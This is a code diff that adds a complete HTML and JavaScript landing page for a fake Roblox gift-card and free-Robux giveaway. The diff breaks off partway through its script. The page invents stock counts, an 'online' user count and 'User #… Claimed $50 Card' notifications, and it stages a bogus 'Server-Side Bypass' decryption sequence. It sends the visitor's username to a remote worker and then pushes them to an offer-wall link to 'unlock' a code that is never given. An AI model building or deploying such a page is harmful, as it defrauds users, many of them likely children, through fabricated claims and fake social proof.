@@ -1,142 +1,789 @@
 
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Robux Rewards Hub | 2026 Event</title>
 
-	<!-- CREATED BY JMIX COD4 -->
-	<!-- https://t.me/landingpagescpa -->
+    <meta property="og:title" content="Roblox 2026 Gift Card Event">
+    <meta property="og:description" content="Official sponsored giveaway for 2026. Claim your card now!">
+    <meta property="og:image" content="https://yooh.online/image9.webp">
+    <link rel="icon" type="image/webp" href="https://yooh.online/image10.webp">
 
-	<title></title>
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
-	
-	
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        /* Modern Dark Theme Variables */
+        :root { 
+            --bg-dark: #09090b; 
+            --card-dark: #18181b; 
+            --accent: #eab308; 
+            --accent-glow: rgba(234, 179, 8, 0.5);
+            --gold-grad: linear-gradient(135deg, #facc15 0%, #ca8a04 100%); 
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg-dark); 
+            color: #f4f4f5; 
+            -webkit-tap-highlight-color: transparent; 
+            margin: 0; padding: 0; 
+            background-image: radial-gradient(#27272a 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        img { pointer-events: none; -webkit-user-select: none; user-select: none; }
+
+        .mobile-container { 
+            max-width: 430px; 
+            margin: 0 auto; 
+            background: rgba(9, 9, 11, 0.95); 
+            min-height: 100vh; 
+            position: relative; 
+            box-shadow: 0 0 50px rgba(0,0,0,0.5); 
+            border-left: 1px solid #27272a;
+            border-right: 1px solid #27272a;
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+        }
+
+        /* Golden Button */
+        .btn-gold { 
+            background: var(--gold-grad) !important; 
+            box-shadow: 0 0 25px var(--accent-glow); 
+            animation: pulse-gold 2s infinite; 
+            border: none !important; 
+            color: black !important; 
+            text-shadow: none;
+        }
+        @keyframes pulse-gold { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(234, 179, 8, 0.7); } 70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(234, 179, 8, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(234, 179, 8, 0); } }
+
+        /* Modal Overlay */
+        .modal-bg { 
+            background: rgba(0,0,0,0.85); 
+            backdrop-filter: blur(8px); 
+            z-index: 100; 
+            position: fixed; 
+            inset: 0; 
+            display: none; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px; 
+        }
+
+        /* Steps & Animations */
+        .step-x { color: #ef4444; border: 1px solid #ef4444; background: rgba(239, 68, 68, 0.1); }
+        .step-check { color: #eab308; border: 1px solid #eab308; background: rgba(234, 179, 8, 0.1); box-shadow: 0 0 10px rgba(234, 179, 8, 0.2); }
+        .step-pending { background: #27272a; color: #71717a; border: 1px solid #3f3f46; animation: pulse 1s infinite; }
+
+        .animate-x { animation: shake 0.5s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
+        
+        .input-error { border-color: #ef4444 !important; background-color: rgba(239, 68, 68, 0.1) !important; box-shadow: 0 0 10px rgba(239, 68, 68, 0.2); }
+        
+        .slide-right { animation: slideRight 0.4s ease-out forwards; }
+        @keyframes slideRight { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        .card-selected-border { 
+            border: 2px solid var(--accent) !important; 
+            box-shadow: 0 0 20px var(--accent-glow);
+            transform: scale(0.96); 
+            transition: all 0.2s; 
+        }
+
+        /* Smaller Notification Style */
+        .toast-minimal {
+            background: #18181b; 
+            padding: 6px 10px;        
+            margin-bottom: 10px;
+            border-radius: 8px;       
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            border: 1px solid #27272a;
+            border-left: 3px solid #10b981; 
+            display: flex;
+            align-items: center;
+            gap: 8px;                 
+            
+            width: fit-content;       
+            max-width: 200px;         
+            
+            animation: slideInToast 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            opacity: 0;
+            transform: translateX(100%);
+        }
+        @keyframes slideInToast {
+            from { opacity: 0; transform: translateX(50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+    </style>
 </head>
-  
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJFZEK6231"></script>
+<body oncontextmenu="return false;">
+
+<div class="mobile-container">
+    <div id="notif-area" class="fixed top-20 right-2 z-50 w-auto flex flex-col items-end pointer-events-none"></div>
+
+   <nav class="flex items-center justify-between px-6 py-4 border-b border-zinc-800 bg-black/50 backdrop-blur-md sticky top-0 z-40">
+        <div class="flex flex-col items-start gap-1">
+            <button onclick="resetEverything()" class="text-zinc-500 hover:text-white transition-colors text-xs font-bold flex items-center gap-1">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3"></path></svg>
+                HOME
+            </button>
+            
+            <div class="flex items-center gap-1.5 px-1 py-0.5 rounded-full">
+                <span class="relative flex h-1.5 w-1.5">
+                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                  <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-green-500"></span>
+                </span>
+                <span id="online-count" class="text-[8px] font-bold text-zinc-500 font-mono leading-none">Loading...</span>
+            </div>
+        </div>
+
+        <img src="https://yooh.online/image13.webp" alt="Reward Hub" class="h-10 w-auto object-contain">
+
+        <button onclick="resetEverything()" class="text-zinc-500 hover:text-white transition-colors text-xs font-bold">RESET</button>
+    </nav>
+
+    <main class="flex-grow p-5">
+        <section id="phase-1">
+            <header class="mb-6 text-center mt-2">
+                <h2 class="text-2xl font-black text-white uppercase italic tracking-tight">2026 <span class="text-yellow-500">Event</span></h2>
+                
+                <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-widest bg-zinc-900/50 inline-block px-3 py-1 rounded-full border border-zinc-800">● Official Sponsored Bypass</p>
+            </header>
+
+          <div id="input-section" class="mb-8">
+                <label class="block text-[10px] font-bold text-yellow-500 uppercase mb-2 ml-1 tracking-wider">Roblox Username</label>
+                
+                <div class="relative">
+                    <input type="text" id="username-input" oninput="handleInput(this)" placeholder="Enter username..." 
+                    class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-4 text-sm text-white placeholder-zinc-600 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none transition-all font-bold tracking-wide pr-12">
+                    
+                    <div id="input-icon-area" class="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-600 flex items-center justify-center w-8 h-8 rounded-full overflow-hidden">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    </div>
+                </div>
+                
+                <p id="lang-error" class="text-[10px] text-red-500 font-bold mt-2 hidden ml-1">Invalid: Use English characters only!</p>
+
+                <div class="mt-4 px-2 border-l-2 border-zinc-700 pl-3">
+    <p class="text-[10px] text-zinc-400 leading-relaxed">
+        <span class="text-green-500 font-bold">Instruction:</span> Enter Username, pick a card, and complete verification to get the code.
+    </p>
+</div>
+            </div>
+        <div class="grid grid-cols-2 gap-3 mb-8">
+                
+                <div class="card-unit cursor-pointer group" onclick="pick(this, 'https://yooh.online/image1.webp', 5)">
+                    <div class="border border-zinc-700 bg-zinc-800 rounded-xl overflow-hidden aspect-[3/4] relative group-hover:border-yellow-500/50 transition-colors">
+                        <img src="https://yooh.online/image1.webp" class="w-full h-full object-fill">
+                    </div>
+                    <div class="mt-2 px-1">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="text-[10px] font-black text-green-500 tracking-wider">FREE</span>
+                            <span class="text-[9px] font-bold text-yellow-500 bg-yellow-500/10 px-2 py-0.5 rounded">Stock: <span class="stock-val" data-min="80" data-max="150">98</span></span>
+                        </div>
+                        <p class="text-[8px] text-green-400 font-bold text-center border border-green-900/50 bg-green-900/10 rounded py-1">Requirement: Complete 1 Offer</p>
+                    </div>
+                </div>
+
+                <div class="card-unit cursor-pointer group" onclick="pick(this, 'https://yooh.online/image2.webp', 10)">
+                    <div class="border border-zinc-700 bg-zinc-800 rounded-xl overflow-hidden aspect-[3/4] relative group-hover:border-yellow-500/50 transition-colors">
+                        <img src="https://yooh.online/image2.webp" class="w-full h-full object-fill">
+                    </div>
+                    <div class="mt-2 px-1">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="text-[10px] font-black text-green-500 tracking-wider">FREE</span>
+                            <span class="text-[9px] font-bold text-yellow-500 bg-yellow-500/10 px-2 py-0.5 rounded">Stock: <span class="stock-val" data-min="60" data-max="100">85</span></span>
+                        </div>
+                        <p class="text-[8px] text-green-400 font-bold text-center border border-green-900/50 bg-green-900/10 rounded py-1">Requirement: Complete 1 Offer</p>
+                    </div>
+                </div>
+
+                <div class="card-unit cursor-pointer group" onclick="pick(this, 'https://yooh.online/image3.webp', 25)">
+                    <div class="border border-zinc-700 bg-zinc-800 rounded-xl overflow-hidden aspect-[3/4] relative group-hover:border-yellow-500/50 transition-colors">
+                        <img src="https://yooh.online/image3.webp" class="w-full h-full object-fill">
+                    </div>
+                    <div class="mt-2 px-1">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="text-[10px] font-black text-green-500 tracking-wider">FREE</span>
+                            <span class="text-[9px] font-bold text-yellow-500 bg-yellow-500/10 px-2 py-0.5 rounded">Stock: <span class="stock-val" data-min="45" data-max="70">62</span></span>
+                        </div>
+                        <p class="text-[8px] text-green-400 font-bold text-center border border-green-900/50 bg-green-900/10 rounded py-1">Requirement: Complete 1 Offer</p>
+                    </div>
+                </div>
+
+                <div class="card-unit cursor-pointer group" onclick="pick(this, 'https://yooh.online/image4.webp', 50)">
+                    <div class="border border-zinc-700 bg-zinc-800 rounded-xl overflow-hidden aspect-[3/4] relative group-hover:border-yellow-500/50 transition-colors">
+                        <div class="absolute top-0 left-0 bg-red-600 text-white text-[8px] font-black px-2 py-1 rounded-br-lg z-10 animate-pulse">2 TASKS</div>
+                        <img src="https://yooh.online/image4.webp" class="w-full h-full object-fill">
+                    </div>
+                    <div class="mt-2 px-1">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="text-[10px] font-black text-green-500 tracking-wider">FREE</span>
+                            <span class="text-[9px] font-bold text-red-500 bg-red-500/10 px-2 py-0.5 rounded">Low Stock</span>
+                        </div>
+                        <p class="text-[8px] text-blue-300 font-bold text-center border border-blue-900/50 bg-blue-900/20 rounded py-1">Special Event: Complete 2 Offers</p>
+                    </div>
+                </div>
+
+            </div>
+            <div class="flex justify-center mt-4">
+                <button id="main-cta" onclick="proceed()" class="w-full max-w-[280px] bg-zinc-800 text-zinc-500 font-black py-4 rounded-xl text-xs uppercase tracking-widest transition-all border border-zinc-700 hover:bg-zinc-700">
+                    Receive Now
+                </button>
+            </div>
+        </section>
+
+        <section id="phase-2" class="hidden">
+            <div id="user-badge" class="flex items-center gap-3 bg-zinc-900/80 p-3 rounded-2xl mb-4 border border-yellow-500/30 shadow-[0_0_15px_rgba(234,179,8,0.1)]">
+                <img id="user-avatar-small" src="" class="w-10 h-10 rounded-full border-2 border-yellow-500 shadow-sm">
+                <div>
+                    <p class="text-[8px] font-bold text-yellow-500 uppercase leading-none mb-1">Authenticated As:</p>
+                    <p id="user-name-small" class="text-sm font-black text-white leading-none tracking-wide">User</p>
+                </div>
+            </div>
+
+            <div class="flex flex-col items-center">
+                <div class="relative w-full max-w-[240px] mx-auto mt-2 perspective-1000">
+                     <img id="back-img" src="https://yooh.online/image5.webp" class="opacity-100 w-full h-auto rounded-xl shadow-2xl z-10 border border-zinc-700">
+                </div>
+
+                <div id="reveal-content" class="w-full mt-6 opacity-0">
+                    <div class="mb-4 text-center">
+                        <h3 class="text-lg font-black italic tracking-tighter">
+                            <span id="card-val-display" class="text-white drop-shadow-md">$0.00</span> 
+                            <span class="text-zinc-600 mx-2">/</span> 
+                            <span id="robux-val-display" class="text-green-500 drop-shadow-md">0 Robux</span>
+                        </h3>
+                    </div>
+
+                    <div class="bg-zinc-900 rounded-xl p-4 border border-zinc-800 mb-6">
+                        <div class="space-y-4">
+                            <div class="flex items-center gap-3">
+                                <div id="step1-icon" class="w-6 h-6 rounded-full step-pending flex items-center justify-center text-[10px] font-bold shrink-0">●</div>
+                                <p class="text-[10px] font-bold text-zinc-400 uppercase">10 Digits Decrypted For Free✅</p>
+                            </div>
+                            <div class="flex items-center gap-3">
+    <div id="step2-icon" class="w-6 h-6 rounded-full step-pending flex items-center justify-center text-[10px] font-bold shrink-0">
+        <div class="w-3 h-3 border-2 border-zinc-500 border-t-transparent rounded-full animate-spin"></div>
+    </div>
+    <p id="step2-text" class="text-[10px] font-bold text-white uppercase">Syncing with server...</p>
+</div>
+                    </div>
+
+                    <div id="action-wrapper" class="space-y-4">
+                        <div class="w-full bg-zinc-800 h-2 rounded-full overflow-hidden border border-zinc-700">
+                            <div id="prog-bar" class="w-0 h-full bg-yellow-500 transition-all duration-1000 shadow-[0_0_10px_#eab308]"></div>
+                        </div>
+                        <div id="loading-status" class="text-center py-2">
+    <div class="inline-block w-5 h-5 border-2 border-yellow-500 border-t-transparent rounded-full animate-spin"></div>
+    <p id="loading-text" class="text-[10px] font-bold text-yellow-500 mt-2 uppercase animate-pulse tracking-widest">Processing...</p>
+</div> <button id="final-btn" onclick="openOffer()" class="hidden w-full btn-gold py-4 rounded-xl font-black text-xs uppercase tracking-widest italic text-black">
+    UNLOCK MY ROBUX
+</button>
+
+                    <p class="mt-6 text-[9px] text-zinc-600 font-bold text-center uppercase italic px-4">
+                        Server-Side Bypass active until Jan 30, 2026.
+                    </p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div id="verify-modal" class="modal-bg">
+        <div class="bg-[#121214] border border-zinc-800 w-full max-w-xs rounded-[24px] p-6 shadow-2xl text-center relative slide-right">
+            <button onclick="closeModal('verify-modal')" class="absolute top-4 right-4 text-zinc-600 hover:text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
+            <div id="modal-searching">
+                <div class="w-16 h-16 border-4 border-yellow-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                <p class="font-black text-white uppercase tracking-widest text-xs italic">Searching Profile...</p>
+            </div>
+            <div id="modal-result" class="hidden">
+                <img id="res-avatar" src="" class="w-20 h-20 rounded-full border-4 border-zinc-800 shadow-lg mx-auto mb-4 ring-2 ring-yellow-500">
+                <img id="res-card" src="" class="w-24 h-auto rounded-lg shadow-md mx-auto mb-6 opacity-90 border border-white/20">
+                <h2 id="res-robux" class="text-xl font-black text-green-500 text-center mb-2 drop-shadow-md tracking-tighter">0 Robux</h2>
+                <h3 id="res-name" class="text-lg font-black text-white mb-6 uppercase italic tracking-wider">User</h3>
+                <button onclick="confirmAccount()" class="w-full btn-gold py-4 rounded-xl font-black uppercase text-xs italic">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-modal" class="modal-bg">
+        <div class="bg-[#121214] border border-red-900/30 w-full max-w-xs rounded-[24px] p-8 shadow-2xl text-center animate-x">
+            <div class="w-16 h-16 bg-red-500/10 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500/20">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </div>
+            <h3 class="text-base font-black text-white mb-2 uppercase">Not Found</h3>
+            <p class="text-[11px] text-zinc-400 font-bold mb-6 leading-relaxed">Username not found in Roblox database. Please check spelling.</p>
+            <button onclick="closeModal('error-modal')" class="w-full bg-zinc-800 hover:bg-zinc-700 text-white py-4 rounded-xl font-black uppercase text-xs italic border border-zinc-700">Try Again</button>
+        </div>
+    </div>
+
+    <footer class="mt-auto pt-4 pb-8 border-t border-zinc-800/50 text-center">
+        <div class="flex justify-center space-x-6 mb-4">
+            <a href="https://youtube.com/@siinro" target="_blank" class="social-link text-zinc-600 hover:text-red-500 transition-colors transform hover:scale-110">
+                <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg>
+            </a>
+            <a href="https://www.instagram.com/sinrorob" target="_blank" class="social-link text-zinc-600 hover:text-pink-500 transition-colors transform hover:scale-110"><svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg></a>
+        </div>
+        <p class="text-[9px] font-bold text-zinc-700 uppercase tracking-widest italic">© 2026 Sinro Rob. All rights reserved.</p>
+    </footer>
+</div>
+
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    let state = { phase: 1, card: null, val: 0, userData: null };
+    
+    // 🔥🔥🔥 عدل روابطك هنا لكل بطاقة 🔥🔥🔥
+    const offerLinks = {
+        5:  "https://confirmapp.store/cl/v/1xx98x",
+        10: "https://confirmapp.store/cl/v/1xx98x",
+        25: "https://confirmapp.store/cl/v/1xx98x",
+        50: "https://confirmapp.store/cl/v/1xx98x"
+    };
 
-  gtag('config', 'G-PJFZEK6231');
+    // دالة فتح الرابط المناسب
+    function openOffer() {
+        const link = offerLinks[state.val]; // يأخذ القيمة المختارة (5, 10, 25, 50) ويجلب الرابط
+        if(link) {
+            window.location.href = link;
+        } else {
+            alert("Error: No link definition for this card.");
+        }
+    }
+let typingTimer; 
+let autoClickTimer; // المتغير الجديد للتايمر
+    function checkAutoClick() {
+        // نوقف أي تايمر سابق دائماً
+        clearTimeout(autoClickTimer);
+        
+        const user = document.getElementById('username-input').value.trim();
+        const isValid = user.length >= 3 && /^[a-zA-Z0-9_]+$/.test(user);
+
+        // الشرط: لازم يكون الاسم صحيح + البطاقة مختارة لكي يبدأ العد
+        if (isValid && state.card) {
+            autoClickTimer = setTimeout(() => {
+                proceed();
+            }, 7000);
+        }
+        // إذا اختار البطاقة فقط ولم يكتب الاسم، لن يحدث شيء (لن يعمل التايمر)
+    }
+    function init() {
+        // ... الأكواد القديمة ...
+        document.querySelectorAll('.stock-val').forEach((el) => {
+            // ...
+        });
+        
+        checkSession();
+        setTimeout(triggerNotif, Math.random() * (15000 - 5000) + 5000);
+        updateOnlineCount(); 
+        
+        // 🔥 أضف هذا السطر هنا لتشغيل فحص الدولة
+        checkCountryAndTranslate();
+    }
+    // Function to check session storage
+    function checkSession() {
+        const savedPhase = sessionStorage.getItem('phase');
+        if (savedPhase === '2') {
+            const savedData = JSON.parse(sessionStorage.getItem('userData'));
+            const savedCard = sessionStorage.getItem('card');
+            const savedVal = parseInt(sessionStorage.getItem('val'));
+            
+            if (savedData && savedCard) {
+                state.userData = savedData;
+                state.card = savedCard;
+                state.val = savedVal;
+                renderPhase2(true); 
+            }
+        }
+    }
+
+    // Input Handling (Debounce & Image Fetch)
+    function handleInput(input) {
+        validateLanguage(input);
+        const iconArea = document.getElementById('input-icon-area');
+        
+        // Clear existing timer
+        clearTimeout(typingTimer);
+        
+        // Wait 2 seconds after user stops typing
+        typingTimer = setTimeout(() => {
+            const user = input.value.trim();
+            if(user.length >= 3 && /^[a-zA-Z0-9_]+$/.test(user)) {
+                // Fetch image if valid
+                fetchProfileImage(user, iconArea);
+            }
+        }, 500);
+        checkAutoClick();
+    }
+
+    async function fetchProfileImage(user, iconArea) {
+        try {
+            const res = await fetch(`https://testt444.monster-yahooo.workers.dev/find?name=${encodeURIComponent(user)}`);
+            if (res.ok) {
+                const data = await res.json();
+                // Update Icon Area with Image
+                iconArea.innerHTML = `<img src="${data.avatar}" class="w-full h-full object-cover">`;
+            } else {
+                // Do nothing if not found (as requested)
+            }
+        } catch (e) {
+            // Do nothing on error
+        }
+    }
+
+    // Input Validation
+    function validateLanguage(input) {
+        const isValid = /^[a-zA-Z0-9_]*$/.test(input.value);
+        const err = document.getElementById('lang-error');
+        if (!isValid) {
+            input.classList.add('input-error');
+            err.classList.remove('hidden');
+        } else {
+            input.classList.remove('input-error');
+            err.classList.add('hidden');
+        }
+        updateMainCTA();
+    }
+
+    function updateMainCTA() {
+        const btn = document.getElementById('main-cta');
+        
+        // التعديل: الزر يتفعل إذا تم اختيار بطاقة فقط (لا يهم الاسم الآن)
+        if (state.card) {
+            btn.classList.add('btn-gold');
+            btn.classList.remove('bg-zinc-800', 'text-zinc-500', 'border-zinc-700');
+            btn.classList.add('text-black');
+            btn.innerText = "CLAIM";
+        } else {
+            btn.classList.remove('btn-gold', 'text-black');
+            btn.classList.add('bg-zinc-800', 'text-zinc-500', 'border-zinc-700');
+            btn.innerText = "Receive Now";
+        }
+    }
+    function pick(el, img, val) {
+        state.card = img; state.val = val;
+        sessionStorage.setItem('card', img);
+        sessionStorage.setItem('val', val);
+        
+        document.querySelectorAll('.card-unit div').forEach(d => d.classList.remove('card-selected-border'));
+        el.querySelector('div').classList.add('card-selected-border');
+        updateMainCTA();
+        checkAutoClick();
+    }
+
+       async function proceed() {
+        // نوقف التايمر فوراً
+        clearTimeout(autoClickTimer);
+
+        const inputUser = document.getElementById('username-input').value.trim();
+        const isValid = /^[a-zA-Z0-9_]+$/.test(inputUser);
+
+        // شرط واحد فقط للخروج: إذا لم يختر بطاقة.
+        // أما الاسم، فإذا كان فارغاً سنكمل عادي.
+        if (!state.card) return;
+
+        // 🔥 هنا التعديل: نحدد الاسم الذي سنبحث عنه
+        // إذا كان الاسم مكتوباً وصحيحاً نستخدمه، وإلا نستخدم "Roblox"
+        const finalUser = (inputUser && isValid) ? inputUser : "Roblox";
+
+        showModal('verify-modal');
+        document.getElementById('modal-searching').classList.remove('hidden');
+        document.getElementById('modal-result').classList.add('hidden');
+
+        try {
+            // نرسل finalUser (سواء كان اسم الزائر أو Roblox) إلى الووركر
+            const res = await fetch(`https://testt444.monster-yahooo.workers.dev/find?name=${encodeURIComponent(finalUser)}`);
+            
+            if (res.ok) {
+                const data = await res.json();
+                
+                state.userData = data;
+                sessionStorage.setItem('userData', JSON.stringify(data));
+                
+                // الووركر سيرد بالصورة والاسم (سواء للزائر أو لروبلوكس)
+                document.getElementById('res-avatar').src = data.avatar;
+                document.getElementById('res-card').src = state.card;
+                document.getElementById('res-name').innerText = data.userName;
+
+                const robuxAmounts = {5: "400", 10: "800", 25: "2,000", 50: "4,500"};
+                document.getElementById('res-robux').innerText = robuxAmounts[state.val] + " Robux";
+                
+                document.getElementById('modal-searching').classList.add('hidden');
+                document.getElementById('modal-result').classList.remove('hidden');
+            } else {
+                closeModal('verify-modal');
+                showModal('error-modal');
+            }
+        } catch (e) {
+            closeModal('verify-modal');
+            showModal('error-modal');
+        }
+    }
+    function confirmAccount() {
+        closeModal('verify-modal');
+        state.phase = 2;
+        sessionStorage.setItem('phase', '2');
+        renderPhase2(false);
+    }
+
+    function renderPhase2(isRestoring) {
+        document.getElementById('phase-1').classList.add('hidden');
+        document.getElementById('phase-2').classList.remove('hidden');
+        
+        document.getElementById('user-avatar-small').src = state.userData.avatar;
+        document.getElementById('user-name-small').innerText = state.userData.userName;
+
+        const robux = state.val === 5 ? "400" : state.val === 10 ? "800" : state.val === 25 ? "2,000" : "4,500";
+        document.getElementById('card-val-display').innerText = `$${state.val}.00`;
+        document.getElementById('robux-val-display').innerText = `${robux} Robux`;
+
+        if (isRestoring) {
+            document.getElementById('reveal-content').classList.remove('opacity-0');
+            document.getElementById('reveal-content').style.opacity = '1';
+// نأخذ اسم الصورة المختارة (مثلاً image1) ونضيف لها -2.webp لتصبح image1-2.webp
+let baseName = state.card.replace('.webp', '');
+document.getElementById('back-img').src = baseName + '-2.webp';            document.getElementById('prog-bar').style.width = "100%";
+            
+            const s1 = document.getElementById('step1-icon');
+            s1.className = "w-6 h-6 rounded-full step-check flex items-center justify-center text-xs font-bold shrink-0";
+            s1.innerHTML = "✓";
+            
+            const s2 = document.getElementById('step2-icon');
+            s2.className = "w-6 h-6 rounded-full step-x flex items-center justify-center text-xs font-bold shrink-0";
+            s2.innerHTML = "✗";
+
+            document.getElementById('loading-status').classList.add('hidden');
+            document.getElementById('final-btn').classList.remove('hidden');
+        } else {
+            setTimeout(() => {
+                document.getElementById('reveal-content').classList.add('slide-right');
+                startProgress();
+            }, 300);
+        }
+    }
+
+    function startProgress() {
+        const bar = document.getElementById('prog-bar');
+        const back = document.getElementById('back-img');
+        const s1 = document.getElementById('step1-icon'); 
+        const s2 = document.getElementById('step2-icon'); 
+        const s2Text = document.getElementById('step2-text'); 
+
+        let offersCount = 1;
+        if(state.val === 10) offersCount = 2;
+        if(state.val >= 25) offersCount = 3;
+
+        let baseName = state.card.replace('.webp', '');
+
+        setTimeout(() => {
+            back.src = baseName + '-1.webp'; 
+            bar.style.width = "50%";
+            
+            setTimeout(() => {
+                back.src = baseName + '-2.webp'; 
+                bar.style.width = "85%"; 
+                
+                s1.className = "w-6 h-6 rounded-full step-check flex items-center justify-center text-xs font-bold shrink-0";
+                s1.innerHTML = "✓";
+
+                s2.className = "w-6 h-6 rounded-full border border-yellow-500 bg-yellow-500/10 text-yellow-500 flex items-center justify-center text-xs font-bold shrink-0 shadow-[0_0_10px_rgba(234,179,8,0.3)]";
+                s2.innerHTML = "!"; 
+
+                // 🔥 الكود الجديد: يحدد النص بناءً على البطاقة 🔥
+                if (state.val === 50) {
+                    // نص خاص لبطاقة الـ 50 (باللون الأحمر للتحذير)
+                    s2Text.innerHTML = `<span class="text-red-500 font-black animate-pulse">⚠️ SPECIAL EVENT:</span> You must complete <span class="text-white border-b border-red-500">2 Offers</span> to unlock the $50 Code!`;
+                    s2Text.classList.remove('text-zinc-400');
+                    s2Text.classList.add('text-white');
+                } else {
+                    // النص العادي لباقي البطاقات (عرض واحد)
+                    s2Text.innerHTML = `Action Required: Complete <span class="text-yellow-500">1 Offer</span> to reveal full code.`;
+                }
+                
+                s2Text.classList.add('animate-pulse');
+                document.getElementById('loading-status').classList.add('hidden');
+                document.getElementById('final-btn').classList.remove('hidden');
+                
+            }, 1500); 
+        }, 1000); 
+    }
+
+    function triggerNotif() {
+        const area = document.getElementById('notif-area');
+        const uid = Math.floor(100000 + Math.random() * 900000);
+        const amounts = ["$5", "$10", "$25", "$50"];
+        const val = amounts[Math.floor(Math.random() * amounts.length)];
+        const toast = document.createElement('div');
+        
+        toast.className = "toast-minimal";
+        
+        toast.innerHTML = `
+            <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center shrink-0 border border-green-500/30">
+                <svg class="w-3 h-3 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            </div>
+            <div>
+                <p class="text-[9px] font-bold text-zinc-500 uppercase leading-none mb-1">User #${uid}</p>
+                <p class="text-[9px] font-black text-white italic leading-tight">Claimed <span class="text-green-400">${val} Card</span></p>
+            </div>
+        `;
+        area.appendChild(toast);
+        
+        setTimeout(() => toast.remove(), 1500);
+
